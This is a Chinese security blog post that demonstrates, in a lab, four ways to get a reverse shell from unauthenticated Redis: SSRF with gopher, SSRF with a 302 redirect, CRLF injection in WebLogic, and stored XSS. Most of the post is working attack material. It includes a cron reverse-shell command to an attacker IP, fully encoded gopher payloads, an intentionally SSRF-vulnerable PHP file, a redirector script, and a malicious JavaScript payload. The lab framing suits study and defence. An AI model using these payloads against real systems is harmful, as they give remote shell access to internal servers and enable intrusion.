<!doctype html><html class="dark light" lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Redis：为什么受伤的总是我？
        
    </title><meta content=Redis：为什么受伤的总是我？ property=og:title><link href=/images/favicon.jpeg rel=icon type=image/png><link href=https://0x0c.cc/fonts.css rel=stylesheet><script src=https://0x0c.cc/js/codeblock.js></script><script src=https://0x0c.cc/js/toc.js></script><script src=https://0x0c.cc/js/note.js></script><script>MathJax={tex:{inlineMath:[[`\$`,`\$`],[`\\\\(`,`\\\\)`]]}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><link href=https://0x0c.cc/atom.xml rel=alternate title=s4kur4 type=application/atom+xml><link href=https://0x0c.cc/theme/dark.css rel=stylesheet><script src=https://0x0c.cc/js/themetoggle.js></script><script>setTheme(`dark`)</script><link href=https://0x0c.cc/main.css media=screen rel=stylesheet><script src=https://0x0c.cc/js/mermaid.js></script><body><div class=content><header><div class=main><a href=https://0x0c.cc>s4kur4</a><div class=socials><a class=social href=https://github.com/S4kur4/ rel=me> <img alt=github src=https://0x0c.cc/social_icons/github.svg> </a></div></div><nav><a href=https://0x0c.cc/posts style=margin-left:.5em>/posts</a><a href=https://0x0c.cc/projects style=margin-left:.5em>/projects</a><a href=https://0x0c.cc/about style=margin-left:.5em>/about</a></nav></header><main><article><div class=title><div class=page-header>Redis：为什么受伤的总是我？<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2017-06-08</time></div></div><div class=toc-container><h1 class=toc-title>Table of Contents</h1><ul class=toc-list><li><a href=https://0x0c.cc/posts/redis-wei-shen-me-shou-shang-de-zong-shi-wo/#ssrf-gopher>ssrf + gopher://</a><li><a href=https://0x0c.cc/posts/redis-wei-shen-me-shou-shang-de-zong-shi-wo/#ssrf-http-302-gopher>ssrf + http:// -> 302 -> gopher://</a><li><a href=https://0x0c.cc/posts/redis-wei-shen-me-shou-shang-de-zong-shi-wo/#0x03-ssrf-crlf>0x03. ssrf + crlf</a><li><a href=https://0x0c.cc/posts/redis-wei-shen-me-shou-shang-de-zong-shi-wo/#xss>xss</a><li><a href=https://0x0c.cc/posts/redis-wei-shen-me-shou-shang-de-zong-shi-wo/#zong-jie>总结</a><li><a href=https://0x0c.cc/posts/redis-wei-shen-me-shou-shang-de-zong-shi-wo/#can-kao>参考</a></ul></div><section class=body><p><strong>前言</strong> ：ssrf开始火起来以后，内网的redis默默成为了背锅侠。未授权访问的问题导致其很容易被作为跳板而成为网络内部沦陷的罪魁祸首，于是每当发现一处ssrf漏洞的时候，大家总是试图去寻找内网中即将躺枪的redis。redis被弹shell弹出伤了，那到底有几种姿势弹shell？这次就用实验来说话。<p><strong>基础知识和准备</strong><p>一些IP：<pre style=color:#61676c;background-color:#fafafa><code><span>Redis: 10.1.2.23
</span><span>WebServer: 10.1.2.22
</span><span>Attacker: 172.168.1.106
</span></code></pre><p>gopher，曾经非常有名的一种信息查找协议，它能将Internet上的文件组织成某种索引，不过现在已经淡出了历史。gopher协议的使用方法为：<pre style=color:#61676c;background-color:#fafafa><code><span>gopher://ip:port/_payload
</span></code></pre><p>使用gopher发出一次GET请求：<pre style=color:#61676c;background-color:#fafafa><code><span>gopher://www.baidu.com:80/_GET%20/search/error.html%20HTTP/1.1%0d%0aHost:www.baidu.com
</span></code></pre><p>通常可以通过捕获其他协议数据流的方式将这些协议进行一定转换进而利用gopher协议通信。由于gopher协议具备这种跨协议通信的特点，也被赋予了万金油协议的别称。下面尝试将redis协议转换成为gopher协议，转换之前我们先来看看正常的redis反弹shell攻击载荷：<pre class=language-bash data-lang=bash style=color:#61676c;background-color:#fafafa><code class=language-bash data-lang=bash><span style=color:#f29718>$</span><span> echo</span><span style=color:#ff8f40> -e </span><span style=color:#86b300>"\n\n*/1 * * * * bash -i >& /dev/tcp/172.168.1.106/7777 0>&1\n\n"</span><span style=color:#ed9366>|</span><span style=color:#f29718>redis-cli</span><span style=color:#ff8f40> -h</span><span> 10.1.2.23</span><span style=color:#ff8f40> -x</span><span> set 1
</span><span style=color:#f29718>$</span><span> redis-cli</span><span style=color:#ff8f40> -h</span><span> 10.1.2.23
</span><span style=color:#f29718>$</span><span> 10.1.2.23:</span><span style=color:#ff8f40>6379</span><span style=color:#ed9366>></span><span> config set dir /var/spool/cron/
</span><span style=color:#f29718>$</span><span> 10.1.2.23:</span><span style=color:#ff8f40>6379</span><span style=color:#ed9366>></span><span> config set dbfilename root
</span><span style=color:#f29718>$</span><span> 10.1.2.23:</span><span style=color:#ff8f40>6379</span><span style=color:#ed9366>></span><span> save
</span></code></pre><p>接下来使用socat监听本地的6379端口的数据流，再将数据流转发给redis服务器：<pre class=language-bash data-lang=bash style=color:#61676c;background-color:#fafafa><code class=language-bash data-lang=bash><span style=color:#f29718>socat</span><span style=color:#ff8f40> -v</span><span> tcp-listen:6379,fork tcp-connect:10.1.2.23:6379
</span></code></pre><p>攻击本地的6379端口，得到这些数据流：<pre class=language-bash data-lang=bash style=color:#61676c;background-color:#fafafa><code class=language-bash data-lang=bash><span style=color:#ed9366>> </span><span style=color:#ff8f40>2017</span><span style=color:#f29718>/06/08</span><span> 14:37:05.164953  length=87 from=17 to=103
</span><span style=color:#f29718>*3</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>3</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>set</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>1</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>1</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>6</span><span style=color:#f29718>0</span><span style=color:#4cbf99>\r
</span><span>
</span><span>
</span><span style=color:#f29718>*/1 </span><span style=color:#ed9366>* * * *</span><span> bash</span><span style=color:#ff8f40> -i </span><span style=color:#ed9366>>&</span><span> /dev/tcp/172.168.1.106/7777 </span><span style=color:#ff8f40>0</span><span style=color:#ed9366>>&</span><span style=color:#ff8f40>1
</span><span>
</span><span>
</span><span style=color:#4cbf99>\r
</span><span style=color:#ed9366>< </span><span style=color:#ff8f40>2017</span><span style=color:#f29718>/06/08</span><span> 14:37:05.181301  length=5 from=9149 to=9153
</span><span style=color:#f29718>+OK</span><span style=color:#4cbf99>\r
</span><span style=color:#ed9366>> </span><span style=color:#ff8f40>2017</span><span style=color:#f29718>/06/08</span><span> 14:37:44.483567  length=57 from=17 to=73
</span><span style=color:#f29718>*4</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>6</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>config</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>3</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>set</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>3</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>dir</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>1</span><span style=color:#f29718>6</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>/var/spool/cron/</span><span style=color:#4cbf99>\r
</span><span style=color:#ed9366>< </span><span style=color:#ff8f40>2017</span><span style=color:#f29718>/06/08</span><span> 14:37:44.501023  length=5 from=9149 to=9153
</span><span style=color:#f29718>+OK</span><span style=color:#4cbf99>\r
</span><span style=color:#ed9366>> </span><span style=color:#ff8f40>2017</span><span style=color:#f29718>/06/08</span><span> 14:37:49.822737  length=52 from=74 to=125
</span><span style=color:#f29718>*4</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>6</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>config</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>3</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>set</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>1</span><span style=color:#f29718>0</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>dbfilename</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>4</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>root</span><span style=color:#4cbf99>\r
</span><span style=color:#ed9366>< </span><span style=color:#ff8f40>2017</span><span style=color:#f29718>/06/08</span><span> 14:37:49.837134  length=5 from=9154 to=9158
</span><span style=color:#f29718>+OK</span><span style=color:#4cbf99>\r
</span><span style=color:#ed9366>> </span><span style=color:#ff8f40>2017</span><span style=color:#f29718>/06/08</span><span> 14:37:53.276943  length=14 from=126 to=139
</span><span style=color:#f29718>*1</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>$</span><span>4</span><span style=color:#4cbf99>\r
</span><span style=color:#f29718>save</span><span style=color:#4cbf99>\r
</span><span style=color:#ed9366>< </span><span style=color:#ff8f40>2017</span><span style=color:#f29718>/06/08</span><span> 14:37:53.313423  length=5 from=9159 to=9163
</span><span style=color:#f29718>+OK</span><span style=color:#4cbf99>\r
</span></code></pre><p>可以看出，上面的数据流中">"表示进入redis服务器6379端口的数据，"<"表示redis服务器返回的消息。因此我们将">"内的数据流使用下面的转换规则进行转换：<pre style=color:#61676c;background-color:#fafafa><code><span>* #代表有几个参数
</span><span>$ #代表下面这个参数是几个字节
</span><span>\r#用%0d%0a表示
</span><span>#空白行用%0a表示
</span></code></pre><p>这样就得到了转换后的攻击载荷：<pre style=color:#61676c;background-color:#fafafa><code><span>gopher://10.1.2.23:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$60%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.168.1.106/7777 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
</span></code></pre><p>将载荷进行一次url全编码：<pre style=color:#61676c;background-color:#fafafa><code><span>gopher://10.1.2.23:6379/_%2a%33%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%25%30%64%25%30%61%31%25%30%64%25%30%61%24%36%30%25%30%64%25%30%61%25%30%61%25%30%61%2a%2f%31%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%37%32%2e%31%36%38%2e%31%2e%31%30%36%2f%37%37%37%37%20%30%3e%26%31%25%30%61%25%30%61%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%64%69%72%25%30%64%25%30%61%24%31%36%25%30%64%25%30%61%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%2f%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%30%25%30%64%25%30%61%64%62%66%69%6c%65%6e%61%6d%65%25%30%64%25%30%61%24%34%25%30%64%25%30%61%72%6f%6f%74%25%30%64%25%30%61%2a%31%25%30%64%25%30%61%24%34%25%30%64%25%30%61%73%61%76%65%25%30%64%25%30%61
</span></code></pre><p>另外，如果向redis服务器发出一个http请求，会有这样的效果：<p><img alt src=https://i.loli.net/2018/07/09/5b435833abcb1.png><p>可以发现http请求头的每一行都被当做命令执行了，所以我们可以将攻击载荷放进一个http请求头部：<pre style=color:#61676c;background-color:#fafafa><code><span>POST / HTTP/1.1
</span><span>HOST:10.1.2.23:6379
</span><span>set 1 "\n\n*/1 * * * * bash -i >& /dev/tcp/172.168.1.106/7777 0>&1\n\n"
</span><span>config set dir /var/spool/cron/
</span><span>config set dbfilename root save
</span></code></pre><p>发送这个请求，成功执行：<p><img alt src=https://i.loli.net/2018/07/09/5b43585b1208a.png><h2 id=ssrf-gopher><a aria-label="Anchor link for: ssrf-gopher" class=zola-anchor href=#ssrf-gopher>ssrf + gopher://</a></h2><p>条件：<ul><li>存在ssrf的PHP web、Java web<li>PHP中curl支持gopher或者curl>7.35.0、Java支持gopher</ul><p>实验环境：<ul><li>Redis2.8.24(centOS7) #10.1.2.23<li>PHP7.1 + Apache2.4.10 #10.1.2.22:8081</ul><p>首先在Apache服务器的8081端口上创建一个含有ssrf漏洞的PHP文件index.php：<pre class=language-php data-lang=php style=color:#61676c;background-color:#fafafa><code class=language-php data-lang=php><span>&LT?php
</span><span>    </span><span style=color:#fa6e32>function </span><span style=color:#f29718>curl</span><span>(</span><span style=color:#ff8f40>$ssrf</span><span>){  
</span><span>        $ch </span><span style=color:#ed9366>= </span><span style=color:#f07171>curl_init</span><span>()</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#f07171>curl_setopt</span><span>($ch</span><span style=color:#61676ccc>, </span><span style=color:#ed9366;font-style:italic>CURLOPT_URL</span><span style=color:#61676ccc>, </span><span>$ssrf)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#f07171>curl_setopt</span><span>($ch</span><span style=color:#61676ccc>, </span><span style=color:#ed9366;font-style:italic>CURLOPT_HEADER</span><span style=color:#61676ccc>, </span><span style=color:#ff8f40>0</span><span>)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#f07171>curl_exec</span><span>($ch)</span><span style=color:#61676ccc>;
</span><span>        </span><span style=color:#f07171>curl_close</span><span>($ch)</span><span style=color:#61676ccc>;
</span><span>    }
</span><span>    $ssrf </span><span style=color:#ed9366>= </span><span>$_GET[</span><span style=color:#86b300>'ssrf'</span><span>]</span><span style=color:#61676ccc>;
</span><span>    </span><span style=color:#f29718>curl</span><span>($ssrf)</span><span style=color:#61676ccc>; 
</span><span>?>
</span></code></pre><p>先尝试访问http://10.1.2.22:8081/index.php?ssrf=file:///etc/passwd确认漏洞是否存在：<p><img alt src=https://i.loli.net/2018/07/09/5b43589381a62.png><p>此时证明漏洞存在，再次确认是否支持gopher://协议：<p><img alt src=https://i.loli.net/2018/07/09/5b4358c156387.png><p>于是直接通过此处的ssrf加载攻击载荷反弹得到shell：<p><img alt src=https://i.loli.net/2018/07/09/5b435905967ed.png><h2 id=ssrf-http-302-gopher><a aria-label="Anchor link for: ssrf-http-302-gopher" class=zola-anchor href=#ssrf-http-302-gopher>ssrf + http:// -> 302 -> gopher://</a></h2><p>条件：<ul><li>存在ssrf的PHP web、Java web<li>PHP中curl支持gopher或者curl>7.35.0、Java支持gopher<li>ssrf只能使用http</ul><p>实验环境：<ul><li>Redis2.8.24(centOS7) #10.1.2.23<li>Discuz!3.1 #10.1.2.22:8080<li>VPS #http://s4kur4.cc</ul><p>此例中在Apache服务器的8080端口运行了一个存在ssrf漏洞的Discuz!论坛，其ssrf产生处将协议限制为http，无法使用其他更多协议：<pre style=color:#61676c;background-color:#fafafa><code><span>http://10.1.2.22:8080/forum.php?mod=ajax&action=downremoteimg&message=[img]http://s4kur4.cc/index.php?hello.jpg[/img]
</span></code></pre><p>由于无法使用gopher协议，因此该ssrf漏洞并不能直接操纵内网的redis服务器。<p>为此，我们在自己的VPS上创建一个302.php对协议进行转换，通过302跳转的方式可以绕过Discuz!对协议的限制。首先在VPS根目录上创建302.php并使用header重定向转至带有攻击载荷的gopher://：<pre class=language-php data-lang=php style=color:#61676c;background-color:#fafafa><code class=language-php data-lang=php><span>&LT?php
</span><span>    </span><span style=color:#f07171>header</span><span>(</span><span style=color:#86b300>"Location:&LTcode class="</span><span style=color:#ff8f40>bash</span><span style=color:#86b300>">gopher://10.1.2.23:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$60%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.168.1.106/7777 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a&LT/code>"</span><span>)</span><span style=color:#61676ccc>;
</span><span>?>
</span></code></pre><p>这里要注意的是跳转指向的URL中，应该要包含攻击载荷转换后的原始字符串，不能做URL编码，否则会出现不成功的情况，因为PHP在重定向URL的过程中不会进行URL编码和解码，如果使用URL编码后的攻击载荷，会导致redis无法理解。<p>接下来先在攻击机上监听，然后使用浏览器或者curl访问以下URL（message参数要进行URL编码）：<pre style=color:#61676c;background-color:#fafafa><code><span>http://10.1.2.22:8080/forum.php?mod=ajax&action=downremoteimg&message=%5bimg%5dhttp%3a%2f%2fs4kur4.cc%2f302.php%3fhello.jpg%5b%2fimg%5d
</span></code></pre><p>过一会儿就收到了弹回的shell：<p><img alt src=https://i.loli.net/2018/07/09/5b435942c3974.png><h2 id=0x03-ssrf-crlf><a aria-label="Anchor link for: 0x03-ssrf-crlf" class=zola-anchor href=#0x03-ssrf-crlf>0x03. ssrf + crlf</a></h2><p>条件：<ul><li>存在ssrf的PHP web、Java Web<li>Web Server存在crlf http头注入</ul><p>实验环境：<ul><li>Redis2.8.24(centOS7) #10.1.2.23<li>Weblogic #10.1.2.22:7001</ul><p>在此例中将在10.1.2.22的7001端口开启一个存在ssrf的weblogic容器，weblogic在10.0.2-10.3.6版本的SearchPublicRegistries.jsp文件中产生了一处ssrf：<pre style=color:#61676c;background-color:#fafafa><code><span>http://10.1.2.22:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://s4kur4.cc&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
</span></code></pre><p><img alt src=https://i.loli.net/2018/07/09/5b43596f196dd.png><p>这里首先利用回显对内网进行扫描探测，找到存在的redis服务器：<p><img alt src=https://i.loli.net/2018/07/09/5b43599256d0d.png><p>由于weblogic同时存在crlf注入漏洞，导致URL中可以注入回车和换行符%0d%0a，于是接下来可以将攻击载荷直接注入请求头中：<pre style=color:#61676c;background-color:#fafafa><code><span>http://10.1.2.22:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://10.1.2.23:6379/%0d%0aset%201%20%22%5cn%5cn%2a%2f1%20%2a%20%2a%20%2a%20%2a%20%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f172%2e168%2e1%2e104%2f7777%200%3E%261%5cn%5cn%22%0d%0aconfig%20set%20dir%20%2fvar%2fspool%2fcron%2f%0d%0aconfig%20set%20dbfilename%20root%0d%0asave%0D%0A%0D%0Aaaa&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
</span></code></pre><p>这里要注意在save后应该再增加一段字符，否则save后面的%0d%0a会导致无法插入而执行失败。<p>在攻击机上设置监听，然后使用浏览器或者curl访问上面的URL即可弹回shell：<p><img alt src=https://i.loli.net/2018/07/09/5b4359e55fa29.png><h2 id=xss><a aria-label="Anchor link for: xss" class=zola-anchor href=#xss>xss</a></h2><p>条件：<ul><li>存在xss的Web<li>已获知内网redis服务器ip地址或Web Server本身运行redis服务但外网无法访问</ul><p>实验环境：<ul><li>Redis2.8.24(centOS7) #10.1.2.23<li>DVWA #10.1.2.23:80<li>VPS #http://s4kur4.cc</ul><p>本例中将会在redis服务器的80端口运行一个存在xss漏洞的web程序，同时对外封闭6379端口，只允许内部访问：<p><img alt src=https://i.loli.net/2018/07/09/5b4359fa6773c.png><p>然后在VPS上创建一个js文件rce.js，URI为http://s4kur4.cc/rce.js，内容如下：<pre class=language-javascript data-lang=javascript style=color:#61676c;background-color:#fafafa><code class=language-javascript data-lang=javascript><span style=color:#fa6e32>var </span><span>cmd </span><span style=color:#ed9366>= new </span><span style=color:#399ee6>XMLHttpRequest</span><span>()</span><span style=color:#61676ccc>;
</span><span>cmd</span><span style=color:#ed9366>.</span><span style=color:#f07171>open</span><span>(</span><span style=color:#86b300>"POST"</span><span style=color:#61676ccc>, </span><span style=color:#86b300>"http://10.1.2.23:6379"</span><span>)</span><span style=color:#61676ccc>;
</span><span>cmd</span><span style=color:#ed9366>.</span><span style=color:#f07171>send</span><span>(</span><span style=color:#86b300>'eval </span><span style=color:#4cbf99>\'</span><span style=color:#86b300>' </span><span style=color:#ed9366>+ </span><span style=color:#86b300>'redis.call(</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>set</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>, </span><span style=color:#4cbf99>\"</span><span style=color:#86b300>1</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>,</span><span style=color:#4cbf99>\"\\</span><span style=color:#86b300>n</span><span style=color:#4cbf99>\\</span><span style=color:#86b300>n*/1 * * * * /bin/bash -i >& /dev/tcp/172.168.1.106/7777 0>&1</span><span style=color:#4cbf99>\\</span><span style=color:#86b300>n</span><span style=color:#4cbf99>\\</span><span style=color:#86b300>n"); redis.call(</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>config</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>, </span><span style=color:#4cbf99>\"</span><span style=color:#86b300>set</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>, </span><span style=color:#4cbf99>\"</span><span style=color:#86b300>dir</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>, </span><span style=color:#4cbf99>\"</span><span style=color:#86b300>/var/spool/cron/</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>); redis.call(</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>config</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>, </span><span style=color:#4cbf99>\"</span><span style=color:#86b300>set</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>, </span><span style=color:#4cbf99>\"</span><span style=color:#86b300>dbfilename</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>, </span><span style=color:#4cbf99>\"</span><span style=color:#86b300>root</span><span style=color:#4cbf99>\"</span><span style=color:#86b300>);' </span><span style=color:#ed9366>+ </span><span style=color:#86b300>'</span><span style=color:#4cbf99>\'</span><span style=color:#86b300> 0' </span><span style=color:#ed9366>+ </span><span style=color:#86b300>"</span><span style=color:#4cbf99>\r\n</span><span style=color:#86b300>"</span><span>)</span><span style=color:#61676ccc>;
</span><span style=color:#fa6e32>var </span><span>cmd </span><span style=color:#ed9366>= new </span><span style=color:#399ee6>XMLHttpRequest</span><span>()</span><span style=color:#61676ccc>;
</span><span>cmd</span><span style=color:#ed9366>.</span><span style=color:#f07171>open</span><span>(</span><span style=color:#86b300>"POST"</span><span style=color:#61676ccc>, </span><span style=color:#86b300>"http://10.1.2.23:6379"</span><span>)</span><span style=color:#61676ccc>;
</span><span>cmd</span><span style=color:#ed9366>.</span><span style=color:#f07171>send</span><span>(</span><span style=color:#86b300>'save</span><span style=color:#4cbf99>\r\n</span><span style=color:#86b300>'</span><span>)</span><span style=color:#61676ccc>;
</span></code></pre><p>接下来在80端口dvwa中的存储型xss处进行测试，在留言板中插入这个外部js：<p><img alt src=https://i.loli.net/2018/07/09/5b435a444d49f.png><p>在攻击机上设置监听，随后去10.1.2.22上以内网用户的身份查看这个页面：<p><img alt src=https://i.loli.net/2018/07/09/5b435a5a8cd86.png><p>过一会儿shell就弹回来了：<p><img alt src=https://i.loli.net/2018/07/09/5b435a83b3d86.png><p>事实上，在这个例子中除了可以利用存储型的xss，其他方式的xss均可以利用，甚至在VPS上构造一个恶意页面等待内网用户点击就能触发执行。<h2 id=zong-jie><a aria-label="Anchor link for: zong-jie" class=zola-anchor href=#zong-jie>总结</a></h2><p>通过前面的四个实验，目前利用redis未授权反弹shell的姿势基本都囊括在其中了，当然每一种类型又会牵出众多漏洞和案例，例如仅ssrf就包含有XXE、FFmpeg、Confluence等多个应用的漏洞。<p>ssrf这类漏洞还有待去更多的挖掘，针对未授权服务的利用方式也不仅仅只有反弹shell。希望本文能帮助大家举一反三，在真实场景中发散思维。<h2 id=can-kao><a aria-label="Anchor link for: can-kao" class=zola-anchor href=#can-kao>参考</a></h2><ol><li>《SSRF in PHP》@JoyChou：<a href=http://joychou.org/index.php/web/phpssrf.html>http://joychou.org/index.php/web/phpssrf.html</a><li>《SSRF in JAVA》@JoyChou：<a href=http://joychou.org/index.php/web/javassrf.html>http://joychou.org/index.php/web/javassrf.html</a><li>《利用gopher协议拓展攻击面》@RicterZ：<a href=https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2>https://ricterz.me/posts/利用%20gopher%20协议拓展攻击面</a><li>《60字节-无文件渗透测试实验》@niexinming：<a href=https://www.n0tr00t.com/2017/03/09/penetration-test-without-file.html>https://www.n0tr00t.com/2017/03/09/penetration-test-without-file.html</a><li>《Build Your SSRF Exploit Framework——一个只影响有钱人的漏洞》@猪猪侠：<a href=http://www.docin.com/p-1750678156.html>http://www.docin.com/p-1750678156.html</a></ol><p>*<strong>转载请注明作者及来源</strong></section></article></main><div class=giscus></div><script async crossorigin issue-term=pathname repo=not-matthias/apollo src=https://utteranc.es/client.js theme=github-light></script></div>